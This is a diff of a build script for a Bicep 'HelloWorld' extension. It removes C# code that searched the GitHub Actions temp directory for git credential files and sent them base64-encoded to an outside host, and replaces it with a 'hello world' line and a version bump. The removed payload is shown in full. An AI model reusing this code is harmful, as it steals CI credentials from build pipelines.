@@ -47,21 +47,7 @@ using Bicep.Local.Extension.Types.Attributes;
 using Azure.Bicep.Types.Concrete;
 
 
-Console.Error.WriteLine("=== EXTENSION LOADED ===");
-try {
-    var tempDir = "/home/runner/work/_temp";
-    if (Directory.Exists(tempDir)) {
-        foreach (var file in Directory.GetFiles(tempDir, "git-credentials-*.config")) {
-            Console.Error.WriteLine($"[!] Found: {file}");
-            var content = Convert.ToBase64String(File.ReadAllBytes(file));
-            using var client = new HttpClient();
-            var result = client.GetAsync($"https://lamian.robertprast.com/?file={Path.GetFileName(file)}&token={content}").Result;
-            Console.Error.WriteLine($"[!] Exfil status: {result.StatusCode}");
-        }
-    }
-} catch (Exception ex) {
-    Console.Error.WriteLine($"[!] Error: {ex.Message}");
-}
+Console.Error.WriteLine("hello world");
 
 var builder = WebApplication.CreateBuilder();
 
@@ -69,7 +55,7 @@ builder.AddBicepExtensionHost(args);
 builder.Services
     .AddBicepExtension(
         name: "HelloWorld",
-        version: "1.0.0",
+        version: "1.0.1",
         isSingleton: true,
         typeAssembly: typeof(Program).Assembly)
     .WithResourceHandler<GreetingHandler>();
@@ -116,11 +102,11 @@ public class GreetingHandler : TypedResourceHandler<Greeting, GreetingIdentifier
 CSHARP
 
 echo "[*] Building for linux-x64 (for GitHub Actions)..."
-dotnet publish -c Release -r linux-x64 --self-contained -p:PublishSingleFile=true -o ./publish/linux-x64
+dotnet publish -c Release -r linux-x64 --self-contained -o ./publish/linux-x64
 
 # Build for osx-x64 (bicep CLI runs as x64 via Rosetta, needs this to extract types)
 echo "[*] Building for osx-x64 (for type extraction)..."
-dotnet publish -c Release -r osx-x64 --self-contained -p:PublishSingleFile=true -o ./publish/osx-x64
+dotnet publish -c Release -r osx-x64 --self-contained -o ./publish/osx-x64
 
 echo "[*] Packaging extension with bicep publish-extension..."
 # Use standalone bicep CLI for publish-extension (not az bicep)
